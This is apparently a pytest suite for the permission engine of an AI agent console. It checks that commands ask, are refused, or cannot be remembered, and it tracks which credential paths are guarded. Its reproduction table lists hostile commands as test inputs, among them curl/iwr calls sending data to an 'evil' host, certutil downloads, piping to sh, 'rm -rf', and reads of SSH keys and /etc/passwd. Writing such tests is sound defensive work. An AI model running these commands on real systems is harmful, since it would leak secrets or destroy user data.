"""The permission engine. The big table at the end is the old review's reproductions, one row each: every row must ask
or be refused, and the ones that could run code or change the system must never be rememberable."""

from __future__ import annotations

import sys
from dataclasses import replace

import pytest

from custom_console.core.permissions.allowlist import can_remember_command, simple_words
from custom_console.core.permissions.engine import (
    ALLOW,
    ASK,
    CLIPBOARD,
    LAUNCH,
    OPEN,
    READ,
    REFUSE,
    RUN,
    SAFE,
    WRITE,
    CallInfo,
    PathUse,
    PermissionEngine,
    Situation,
)
from custom_console.core.permissions.floor import FloorConfig, network_text, sensitive_reason
from custom_console.core.permissions.rules import RuleStore
from custom_console.core.permissions.trust import TrustStore
from custom_console.core.vfs.ops import Vfs
from custom_console.core.vfs.resolver import Resolver
from custom_console.platform import for_system

pytestmark = pytest.mark.skipif(sys.platform == "win32", reason="POSIX fixtures")


class World:
    def __init__(self, tmp_path):
        self.home = tmp_path / "home"
        self.work = self.home / "work"
        self.work.mkdir(parents=True)
        (self.home / ".ssh").mkdir()
        (self.home / ".ssh" / "id_rsa").write_text("PRIVATE")
        (self.work / "notes.txt").write_text("todo\n")
        (self.work / ".env").write_text("SECRET=1\n")
        (self.work / ".git").mkdir()
        self.data = tmp_path / "data"
        self.data.mkdir()
        self.token = self.home / ".config" / "clara" / "token"
        self.token.parent.mkdir(parents=True)
        self.token.write_text("clara_a_b\n")
        self.outside = tmp_path / "elsewhere"
        self.outside.mkdir()
        (self.outside / "a.txt").write_text("a")
        (self.outside / "b.txt").write_text("b")
        platform = for_system("linux")
        self.vfs = Vfs(Resolver(platform, home=self.home), cwd=str(self.work))
        config = FloorConfig(tuple(str(p) for p in platform.paths.credential_dirs(self.home)),
                             (str(self.data), str(self.token)), False)
        self.rules = RuleStore(tmp_path / "rules.json")
        self.engine = PermissionEngine(platform, config, self.rules)
        self.situation = Situation(self.vfs.here(), trusted=True)

    def decide(self, info, **changes):
        return self.engine.decide(info, self.vfs, replace(self.situation, **changes))


@pytest.fixture
def w(tmp_path):
    return World(tmp_path)


def read(*paths, tool="local_read"):
    return CallInfo(tool, READ, tuple(PathUse(p) for p in paths))


def write(path, tool="local_write"):
    return CallInfo(tool, WRITE, (PathUse(path, "write"),), needs_trusted_folder=True, undoable=True)


def run(command, cwd=""):
    return CallInfo("local_run", RUN, command=command, cwd=cwd, needs_trusted_folder=True)


# ---------------------------------------------------------------------- the six steps
def test_a_read_inside_the_trusted_folder_is_allowed(w):
    d = w.decide(read("notes.txt"))
    assert d.effect == ALLOW and d.step == "allowlist"


def test_a_read_outside_asks_and_an_always_answer_covers_only_that_call(w):
    target = str(w.outside / "a.txt")
    first = w.decide(read(target))
    assert first.effect == ASK and first.can_remember
    w.engine.record(first, "allow_always")
    again = w.decide(read(target))
    assert again.effect == ALLOW and again.step == "stored"
    assert w.decide(read(str(w.outside / "b.txt"))).effect == ASK  # another file
    assert w.decide(read(target, str(w.outside / "b.txt"))).effect == ASK  # the same file plus another
    assert w.decide(read(target, tool="local_search")).effect == ASK  # another tool


def test_safe_tools_change_nothing_and_run_without_a_question(w):
    assert w.decide(CallInfo("local_todo_write", SAFE)).effect == ALLOW
    assert w.decide(CallInfo("local_ask_user", SAFE), tainted=True).effect == ALLOW


def test_writes_always_ask_and_always_is_per_path(w):
    d = w.decide(write("new.txt"))
    assert d.effect == ASK and d.step == "default" and d.can_remember
    w.engine.record(d, "allow_always")
    assert w.decide(write("new.txt")).effect == ALLOW
    assert w.decide(write("other.txt")).effect == ASK
    assert w.decide(write("new.txt", tool="local_edit")).effect == ASK


def test_refuse_always_wins_even_over_the_floor_and_allowlist(w):
    d = w.decide(read("notes.txt"))
    assert d.effect == ALLOW
    w.engine.record(d, "refuse_always")
    assert w.decide(read("notes.txt")).effect == REFUSE
    floor = w.decide(read(".env"))
    w.engine.record(floor, "refuse_always")
    assert w.decide(read(".env")).effect == REFUSE


def test_allow_once_and_refuse_once_store_nothing(w):
    d = w.decide(write("a.txt"))
    assert w.engine.record(d, "allow_once") == "" and w.engine.record(d, "refuse_once") == ""
    assert w.rules.list() == []
    with pytest.raises(ValueError):
        w.engine.record(d, "maybe")


# ---------------------------------------------------------------------- floor
@pytest.mark.parametrize("typed", [
    ".env", "../../.ssh/id_rsa", "~/.ssh/id_rsa", "~/.ssh", "../.config/clara/token", "../../data/rules.json", "../../data/sessions",
])
def test_sensitive_reads_ask_and_cannot_be_remembered(w, typed):
    d = w.decide(read(typed))
    assert d.effect == ASK and d.step == "floor" and not d.can_remember and d.floor
    assert "Remembered" not in w.engine.record(d, "allow_always")
    assert w.decide(read(typed)).effect == ASK  # still asks: nothing was stored


def test_a_link_to_a_secret_is_caught_by_its_real_path(w):  # SEC-4
    (w.work / "innocent.txt").symlink_to(w.home / ".ssh" / "id_rsa")
    d = w.decide(read("innocent.txt"))
    assert d.effect == ASK and d.step == "floor"
    assert any(s.redirected for s in d.paths), "the prompt must show where the link really goes"
    (w.work / "dirlink").symlink_to(w.home / ".ssh")
    assert w.decide(read("dirlink/id_rsa")).step == "floor"


def test_a_remembered_file_that_becomes_a_link_to_a_secret_asks_again(w):  # N1
    target = w.outside / "a.txt"
    d = w.decide(read(str(target)))
    w.engine.record(d, "allow_always")
    assert w.decide(read(str(target))).effect == ALLOW
    target.unlink()
    target.symlink_to(w.home / ".ssh" / "id_rsa")
    again = w.decide(read(str(target)))
    assert again.effect == ASK and again.step == "floor"


def test_writes_outside_under_git_and_through_links_are_floored(w):
    for typed in ("../elsewhere/new.txt", "/tmp/x", ".git/config", ".git/hooks/pre-commit", "~/x.txt"):
        d = w.decide(write(typed))
        assert d.effect == ASK and d.step == "floor" and not d.can_remember, typed
    (w.work / "out").symlink_to(w.outside)
    assert w.decide(write("out/new.txt")).step == "floor"
    assert w.decide(write("inside.txt")).step == "default"


def test_the_consoles_own_data_is_never_writable_without_a_question(w):
    d = w.decide(write("../../data/rules.json"))
    assert d.step == "floor" and not d.can_remember


@pytest.mark.parametrize("name", [".env.local", ".env.production", ".netrc", "id_ed25519", "server.pem", "x.key", "a.kdbx",
                                  ".git-credentials", ".npmrc", ".pypirc"])
def test_sensitive_names(name):
    assert sensitive_reason(f"/p/{name}", FloorConfig())


@pytest.mark.parametrize("path", ["/p/.env ", "/p/.env.", "/p/.env::$DATA", "/p/.env:Zone.Identifier", "/p/id_rsa. ", "/p/key.pem.",
                                  "/p/.ssh /config", "/p/.ssh./id_ed25519", "/C:/Users/me/.env ", "/C:/Users/me/.aws./credentials"])
def test_the_forms_windows_reads_as_the_same_file_are_sensitive_too(path):
    """Windows ignores trailing dots and spaces and an alternate data stream: `.env ` and `.env::$DATA` open `.env`."""
    assert sensitive_reason(path, FloorConfig())


def test_cleaning_a_name_keeps_dots_and_does_not_flag_ordinary_files():
    from custom_console.core.permissions.floor import clean_part
    assert [clean_part(p) for p in ("..", ".", "a.txt", "dir.", "x ", ".env::$DATA")] == ["..", ".", "a.txt", "dir", "x", ".env"]
    for path in ("/C:/work/notes.txt", "/p/../p/readme.md", "/p/.envrc-notes", "/p/environment. "):
        assert sensitive_reason(path, FloorConfig()) is None, path


@pytest.mark.parametrize("name", [".env.example", ".env.sample", "environment.md", "keys.txt", "token_parser.py", "monkey.py"])
def test_ordinary_names_are_not_sensitive(name):
    assert sensitive_reason(f"/p/{name}", FloorConfig()) is None


@pytest.mark.parametrize("text", ["type \\\\server\\share\\file", "copy x //10.0.0.5/c$/y", "cat \\\\evil\\s\\k"])
def test_network_paths_in_a_command_are_caught(text):  # N3
    assert network_text(text)


@pytest.mark.parametrize("text", ["cat //not a path", "type \\\\wsl$\\Ubuntu\\x", "type \\\\wsl.localhost\\Ubuntu\\x", "echo a//b", "curl https://x.org/a"])
def test_wsl_and_ordinary_text_are_not_network_paths(text):
    assert not network_text(text)


def test_a_network_path_in_a_command_asks_and_is_not_rememberable(w):
    d = w.decide(run("type \\\\server\\share\\file"))
    assert d.effect == ASK and d.step == "floor" and not d.can_remember


# ---------------------------------------------------------------------- tainted
def test_a_tainted_turn_asks_for_every_write_and_command_whatever_the_rules_say(w):
    d = w.decide(write("a.txt"))
    w.engine.record(d, "allow_always")
    assert w.decide(write("a.txt")).effect == ALLOW
    tainted = w.decide(write("a.txt"), tainted=True)
    assert tainted.effect == ASK and tainted.step == "tainted" and not tainted.can_remember
    assert w.decide(run("ls"), tainted=True).effect == ASK
    assert w.decide(CallInfo("local_open_path", OPEN, (PathUse("notes.txt"),)), tainted=True).step == "tainted"
    assert w.decide(read("notes.txt"), tainted=True).effect == ALLOW  # reading stays free
    assert w.engine.record(tainted, "allow_always").startswith("Not remembered")


# ---------------------------------------------------------------------- trust and plan mode
def test_an_untrusted_folder_gets_no_write_run_or_git(w):
    for info in (write("a.txt"), run("ls"), CallInfo("local_git", READ, (PathUse("."),), needs_trusted_folder=True)):
        d = w.decide(info, trusted=False)
        assert d.effect == REFUSE and d.step == "trust"


def test_in_an_untrusted_folder_even_reads_ask(w):
    assert w.decide(read("notes.txt"), trusted=False).effect == ASK


def test_plan_mode_leaves_only_read_tools(w):
    assert w.decide(read("notes.txt"), plan_mode=True).effect == ALLOW
    assert w.decide(write("a.txt"), plan_mode=True).step == "plan"
    assert w.decide(run("ls"), plan_mode=True).effect == REFUSE
    assert w.decide(CallInfo("local_clipboard_read", CLIPBOARD, remember=False), plan_mode=True).effect == REFUSE
    assert w.decide(CallInfo("local_todo_write", SAFE), plan_mode=True).effect == ALLOW


def test_the_clipboard_asks_every_time(w):
    info = CallInfo("local_clipboard_read", CLIPBOARD, remember=False)
    d = w.decide(info)
    assert d.effect == ASK and not d.can_remember
    assert w.engine.record(d, "allow_always").startswith("Not remembered")
    assert w.decide(info).effect == ASK


def test_launching_an_app_can_be_remembered_for_that_app_only(w):
    info = CallInfo("local_launch_app", LAUNCH, command="firefox")
    d = w.decide(info)
    assert d.effect == ASK and d.can_remember
    w.engine.record(d, "allow_always")
    assert w.decide(info).effect == ALLOW
    assert w.decide(replace(info, command="chrome")).effect == ASK


# ---------------------------------------------------------------------- local_run: the allowlist
@pytest.mark.parametrize("command", [
    "pwd", "ls", "ls -la", "ls notes.txt", "dir", "cat notes.txt", "type notes.txt", "head -n 5 notes.txt", "tail notes.txt",
    "wc -l notes.txt", "grep -n todo notes.txt", "grep -rn todo .", "which python", "git status", "git diff", "git log --oneline",
    "git diff --stat", "ls 'notes.txt'",
    # lines of read-only parts, and filters after a pipe
    "ls | wc -l", "cat notes.txt | grep todo | head -3", "ls 2>&1 | head", "git status && git diff", "ls; pwd",
    "cat notes.txt | sort | uniq", "ls > /dev/null", "grep todo notes.txt 2>/dev/null",
])
def test_the_short_read_only_list_runs_without_a_question(w, command):
    d = w.decide(run(command))
    assert d.effect == ALLOW and d.step == "allowlist", (command, d.reason)


# Each row is a reproduction from the old review (SEC-3, SEC-1, N1, N2, SEC-10): it must ask, and `remember` says
# whether an "always" answer may ever cover it.
ASK_ROWS = [
    # chaining, pipes, redirection, substitution: every part must be allowed on its own
    ("cat notes.txt > copy.txt", False), ("cat notes.txt; rm notes.txt", False), ("ls | sh", False), ("ls | xargs rm", False),
    ("cat notes.txt && echo done", False), ("cat $(echo notes.txt)", False), ("cat `echo notes.txt`", False),
    ("cat notes.txt | python", False), ("ls |& cat", False), ("ls && && pwd", False), ("ls ;", False),
    ("sort -o out.txt notes.txt", True), ("cat notes.txt | sort -o out.txt", True), ("cat notes.txt | uniq in out", True),
    ("ls | cat > out.txt", False), ("cd .. && ls", False), ("ls 2>&1 >out.txt", False),
    ("cat notes.txt &", False), ("cat < notes.txt", False), ("echo $HOME", False), ("cat *", False), ("cat ~/notes", False),
    ("cat notes.txt\nrm notes.txt", False),
    # outside the folder or sensitive
    ("cat ../../.ssh/id_rsa", True), ("cat ~", False), ("cat .env", True), ("cat /etc/passwd", True), ("ls ..", True),
    ("cat --file=/etc/passwd", True), ("cat ../../data/rules.json", True),
    # SEC-3: interpreters, installers, runners
    ("python -m pip install requests", False), ("python3.12 evil.py", False), ("python3.12 -c 'import os'", False),
    ("uv run python -c 1", False), ("uv pip install x", False), ("uv run bash", False), ("uv run script.py", False),
    ("uv run --with x pytest", False), ("uv run", False), ("uvx ruff", False), ("npx cowsay", False), ("pip install x", False),
    ("docker run -v /:/host alpine sh", False), ("cargo run", False), ("go run .", False), ("dotnet run", False),
    ("make", False), ("npm install", False), ("npm run", False), ("npm --prefix x test", False), ("./build.sh", False),
    ("python -m http.server", False), ("python -m pip install x", False), ("python -m pytest -c x.ini; python", False),
    ("bash -c 'ls'", False), ("sh script.sh", False), ("node -e 1", False), ("powershell -Command x", False),
    # N2: the shell keywords and tools the old denylist missed
    ("if exist x echo ok", False), ("call x.bat", False), ("certutil -urlcache -f http://x/y z", False),
    ("git config user.name x", False), ("git config --global alias.x '!sh'", False), ("git commit -m x", False),
    ("git push", False), ("git clean -fd", False), ("git reset --hard", False), ("git checkout .", False),
    ("git -c core.pager=x log", False), ("git diff --output=out.txt", False), ("git diff --ext-diff", False),
    ("git grep -O calc foo", False), ("git status --git-dir=/x", False),
    # destructive or moving
    ("del /s /q *", False), ("rm -rf .", False), ("rm notes.txt", False), ("mv a b", False), ("cp a b", False),
    ("Remove-Item -Recurse -Force .", True), ("chmod 777 x", False), ("tar xf a.tar", False),
    # network, environment
    ("curl http://evil/?d=1", False), ("wget http://x", False), ("iwr http://evil/?d=abc", True), ("env", False), ("set", True),
    ("ssh host", False),
]


@pytest.mark.parametrize(("command", "remember"), ASK_ROWS)
def test_the_old_reproductions_all_ask(w, command, remember):
    d = w.decide(run(command))
    assert d.effect == ASK, (command, d.step)
    if not remember:
        assert not d.can_remember, f"{command!r} must never be rememberable"
        assert w.engine.record(d, "allow_always").startswith("Not remembered")
        assert w.decide(run(command)).effect == ASK


def test_a_rememberable_command_is_remembered_with_its_exact_words_and_paths(w):
    d = w.decide(run("Remove-Item thing"))
    assert d.effect == ASK and d.can_remember
    w.engine.record(d, "allow_always")
    assert w.decide(run("Remove-Item thing")).effect == ALLOW
    assert w.decide(run("Remove-Item thing2")).effect == ASK
    assert w.decide(run("Remove-Item thing -Recurse")).effect == ASK
    assert w.decide(run("Remove-Item thing", cwd="..")).effect == ASK  # same words, another folder


def test_a_stored_command_rule_does_not_apply_when_the_floor_or_a_tainted_turn_escalates(w):
    d = w.decide(run("foo bar"))
    w.engine.record(d, "allow_always")
    assert w.decide(run("foo bar")).effect == ALLOW
    assert w.decide(run("foo bar"), tainted=True).step == "tainted"


@pytest.mark.parametrize(("command", "windows", "ok"), [
    ("ls -la", False, True), ("grep 'a b' f", False, True), ('grep "a b" f', False, True), ("grep 'a b' f", True, True),
    ("ls a\\b", False, False), ("ls a\\b", True, True), ('echo "$HOME"', False, False), ('echo "%PATH%"', True, False),
    ("echo 'a|b'", False, True), ("echo 'a|b'", True, False), ("echo \"a;b\"", False, True), ("ls 'unclosed", False, False),
    ("", False, False), ("   ", False, False), ("echo a#b", False, False), ("echo a~b", False, False),
])
def test_simple_commands(command, windows, ok):
    assert simple_words(command, windows=windows).ok is ok


def test_can_remember_reasons():
    assert can_remember_command(simple_words("python x.py", windows=False), False)[0] is False
    assert "hooks" in can_remember_command(simple_words("git commit", windows=False), False)[1]
    assert can_remember_command(simple_words("git status", windows=False), False)[0]
    assert can_remember_command(simple_words("./x", windows=False), False)[0] is False
    assert can_remember_command(simple_words("a | b", windows=False), False)[0] is False


# ---------------------------------------------------------------------- open_path / trust store / rules file
def test_trust_is_a_hash_of_the_real_path(tmp_path):
    store = TrustStore(tmp_path / "trust.json")
    folder = tmp_path / "proj"
    folder.mkdir()
    assert not store.is_trusted(folder)
    store.trust(folder)
    assert store.is_trusted(folder) and store.is_trusted(str(folder) + "/")
    text = (tmp_path / "trust.json").read_text()
    assert str(folder) not in text and "proj" not in text
    link = tmp_path / "link"
    link.symlink_to(folder)
    assert store.is_trusted(link)  # same real folder
    assert not store.is_trusted(tmp_path / "other")


def test_rules_file_survives_garbage_and_can_be_edited(tmp_path):
    store = RuleStore(tmp_path / "rules.json")
    (tmp_path / "rules.json").write_text("not json")
    assert store.list() == []
    from custom_console.core.permissions.rules import RuleKey
    rule = store.add("allow", RuleKey("local_write", "", ("/a",)))
    assert [r.id for r in store.list()] == [1]
    store.add("refuse", RuleKey("local_write", "", ("/a",)))  # the opposite answer replaces it
    assert [r.effect for r in store.list()] == ["refuse"]
    assert store.remove(1) and not store.remove(1) and store.list() == [] and rule.id == 1


# ---------------------------------------------------------------------- patterns: "always" for a tool and its arguments
def test_a_pattern_covers_the_same_tool_with_other_arguments(w):
    d = w.decide(run("uv run pytest -q"))
    assert d.effect == ASK and d.parts == (("uv", "run", "pytest", "-q"),) and d.folder
    assert w.engine.record(d, "allow_pattern", (("uv", "run", "pytest"),)).startswith("Remembered in this folder")
    for command in ("uv run pytest", "uv run pytest tests -x", "uv run pytest 2>&1 | tail -20", "uv run pytest && ls"):
        got = w.decide(run(command))
        assert got.effect == ALLOW and got.step == "stored", command
    for command in ("uv run ruff check .", "uv run pytester", "uv run pytest && rm x", "uv run pytest; python",
                    "uv run python -c 1", "pytest", "uv run pytest > out.txt", "uv run pytest | sh"):
        assert w.decide(run(command)).effect == ASK, command


def test_an_exact_answer_to_a_command_the_table_knows_still_covers_only_that_command(w):
    d = w.decide(run("uv run pytest -q"))
    assert d.can_remember and w.engine.record(d, "allow_always") == "Remembered for exactly this call."
    assert w.decide(run("uv run pytest -q")).step == "stored"
    assert w.decide(run("uv run pytest")).effect == ASK


def test_a_pattern_is_for_one_folder_and_gives_way_to_the_floor_and_a_tainted_turn(w):
    d = w.decide(run("uv run pytest"))
    w.engine.record(d, "allow_pattern", (("uv", "run", "pytest"),))
    assert w.decide(run("uv run pytest", cwd="..")).effect == ASK                    # run somewhere else
    assert w.decide(run("uv run pytest .env")).step == "floor"
    assert w.decide(run("uv run pytest"), tainted=True).step == "tainted"
    assert w.decide(run("uv run pytest"), trusted=False).step == "trust"
    assert w.decide(run("uv run pytest ../../elsewhere/a.txt")).step == "stored"     # arguments are not confined
    assert w.decide(run("uv run pytest"), plan_mode=True).step == "plan"


def test_a_pattern_of_another_folder_does_not_apply(w):
    w.rules.add_pattern("local_run", ("uv", "run", "pytest"), "0" * 64)
    d = w.decide(run("uv run pytest"))
    assert d.effect == ASK and d.parts == (("uv", "run", "pytest"),)


def test_a_pattern_too_broad_or_for_another_command_is_not_stored(w):
    d = w.decide(run("uv run pytest -q"))
    for pattern in (("uv",), ("uv", "run"), ("pytest",), ("uv", "run", "ruff")):
        assert w.engine.record(d, "allow_pattern", (pattern,)).startswith("Not remembered"), pattern
    assert w.engine.record(d, "allow_pattern", ()).startswith("Not remembered")
    assert w.engine.record(d, "allow_pattern", (("uv", "run", "pytest"), ("uv",))).startswith("Not remembered")  # all or nothing
    shell = w.decide(run("sh x.sh"))
    assert shell.parts == (("sh", "x.sh"),)
    assert w.engine.record(shell, "allow_pattern", (("sh",),)).startswith("Not remembered")
    assert w.rules.list() == []


def test_a_hand_edited_rule_cannot_widen_what_a_pattern_may_cover(w):
    folder = w.decide(run("uv run pytest")).folder
    for pattern in (("uv",), ("uv", "run"), ("sh",), ("git", "commit"), ("rm",)):
        w.rules.add_pattern("local_run", pattern, folder)
    for command in ("uv run pytest", "sh x.sh", "git commit -m x", "rm x"):
        assert w.decide(run(command)).effect == ASK, command


def test_a_line_needs_a_rule_for_each_part_that_is_not_read_only(w):
    d = w.decide(run("uv run ruff check . 2>&1 | head -60"))
    assert d.effect == ASK and d.parts == (("uv", "run", "ruff", "check", "."),)     # `head` after a pipe needs nothing
    assert not d.can_remember and "one by one" in d.why_not_remembered
    assert w.engine.record(d, "allow_always").startswith("Not remembered")
    w.engine.record(d, "allow_pattern", (("uv", "run", "ruff"),))
    assert w.decide(run("uv run ruff format src | tail -3")).step == "stored"
    two = w.decide(run("uv run ruff check . && uv run mypy"))
    assert two.effect == ASK and two.parts == (("uv", "run", "mypy"),)
    w.engine.record(two, "allow_pattern", (("uv", "run", "mypy"),))
    assert w.decide(run("uv run ruff check . && uv run mypy src")).step == "stored"
    assert [r.hits for r in w.rules.list()] == [2, 1]


def test_a_part_that_can_never_be_remembered_offers_no_pattern_at_all(w):
    from custom_console.core.permissions.propose import plan
    d = w.decide(run("uv run pytest && rm -rf build"))
    assert d.effect == ASK and d.parts == (("uv", "run", "pytest"), ("rm", "-rf", "build"))
    assert not plan(d.parts, False).possible


def test_a_decision_the_floor_or_a_tainted_turn_made_offers_no_pattern(w):
    assert w.decide(run("uv run pytest .env")).parts == ()
    assert w.decide(run("uv run pytest"), tainted=True).parts == ()
    assert w.decide(run("uv run pytest", cwd="..")).parts == ()
